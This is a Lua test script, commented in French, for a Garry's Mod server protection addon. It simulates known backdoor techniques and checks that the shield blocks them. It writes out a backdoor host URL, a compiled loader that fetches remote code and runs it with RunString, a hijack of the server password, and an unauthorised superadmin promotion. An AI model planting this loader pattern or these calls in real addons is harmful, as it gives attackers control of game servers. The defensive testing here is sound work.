-- Test du bouclier Astral Shield : simule les techniques des portes dérobées trouvées le 2026-11-02.
-- Volontairement hors du dossier « astral_tools » (les chemins contenant « astral » sont considérés comme fiables).
-- Aucune donnée réelle n'est touchée : adresses factices, bot pour le test de rang.
-- Console serveur : lua_openscript securite_tests/test_bouclier.lua
local function out(ok, msg) print(string.format("[Astral Test] %s %s", ok and "OK   " or "ECHEC", msg)) end
if not AstralShield then return out(false, "bouclier absent") end
local before = AstralShield.Blocked

-- 1. Adresse connue de porte dérobée : aucune requête ne doit partir
local failed
http.Fetch("https://kvcdoor.ovh/f.php?key=TEST", function() failed = "réussi" end, function(e) failed = e end)
out(failed == "blocked", "adresse kvcdoor.ovh bloquée avant envoi")

-- 2. Signature des fausses textures : chargeur compilé
local fn = CompileString('timer.Simple(1, function() http.Fetch("https://exemple.invalid/f.php", function(b) RunString(b, ":", false) end) end)', "test_vtf", false)
out(isstring(fn), "chargeur « http.Fetch + RunString » refusé à la compilation")

-- 3. Exécution normale toujours possible
AstralShieldTestValue = nil
RunString("AstralShieldTestValue = 42", "test_normal")
out(AstralShieldTestValue == 42, "RunString normal toujours autorisé")

-- 4. Code reçu par HTTP puis exécuté (adresse légitime)
http.Fetch("https://api.github.com/zen", function(body)
	AstralShieldTestValue = nil
	RunString("AstralShieldTestValue = 99", "test_http")
	out(AstralShieldTestValue == nil, "RunString dans une réponse HTTP bloqué")
	local n = AstralShield.Blocked
	RunConsoleCommand("sv_password", "piratage")
	out(AstralShield.Blocked == n + 1, "commande sv_password depuis une réponse HTTP bloquée")
	print("[Astral Test] Blocages pendant le test : " .. (AstralShield.Blocked - before))
end, function(e) out(false, "requête de contrôle impossible : " .. tostring(e)) end)

-- 5. Promotion de rang hors ULX (sur un bot)
RunConsoleCommand("sv_hibernate_think", "1")
local bot = player.CreateNextBot("BouclierTest")
timer.Simple(3, function()
	if not IsValid(bot) then return out(false, "bot absent") end
	bot:SetUserGroup("superadmin")
	out(not bot:IsSuperAdmin(), "promotion superadmin hors ULX bloquée (rang : " .. bot:GetUserGroup() .. ")")
	bot:Kick("Fin du test bouclier")
end)
